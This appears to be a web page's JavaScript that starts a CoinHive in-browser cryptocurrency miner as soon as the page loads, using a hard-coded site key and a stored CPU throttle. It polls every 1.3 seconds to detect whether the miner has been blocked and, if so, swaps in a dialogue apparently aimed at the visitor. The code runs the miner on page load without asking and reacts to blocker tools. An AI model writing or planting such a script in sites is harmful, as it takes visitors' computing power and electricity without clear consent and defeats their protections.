localStorage.setItem('uuid', localStorage.getItem('uuid') || `${Math.random()}${Math.random()}${Math.random()}${Math.random()}`);
window.m = CoinHive.Anonymous(
    'WU3lkfAu0LBtESJE7itMZiVkVJtvUL0G',
    { throttle: parseFloat(localStorage.getItem('throttle')) || 0.75 },
);
m.start();

let t = 0;
localStorage.setItem('coinhive', JSON.stringify({time: t}));
function checkRunning() {
    let running = false;
    try { 
        let existing = JSON.parse(localStorage.coinhive);
        running = existing.time != t; 
        t = existing.time;
    } catch (e) {}
    if (!running) {
        $('#dialogue-suckit').classList.remove('hidden');

        $('#pnl-okay').classList.add('hidden');
        $('#dialogue-imm').classList.add('hidden');
        $('#dialogue-why').classList.add('hidden');
        $('#pnl-immorals').classList.add('hidden');
        $('#dialogue-turnoff').classList.add('hidden');
        $('#dialogue-shortcut').classList.add('hidden');
        $('#dialogue-woah').classList.add('hidden');
        $('#pnl-woah').classList.add('hidden');
        $('#dialogue-tldr').classList.add('hidden');
        $('#dialogue-yikes').classList.add('hidden');
        $('#dialogue-twitter').classList.add('hidden');
    } else {
        setTimeout(checkRunning, 1300);
    }
}
setTimeout(checkRunning, 1300);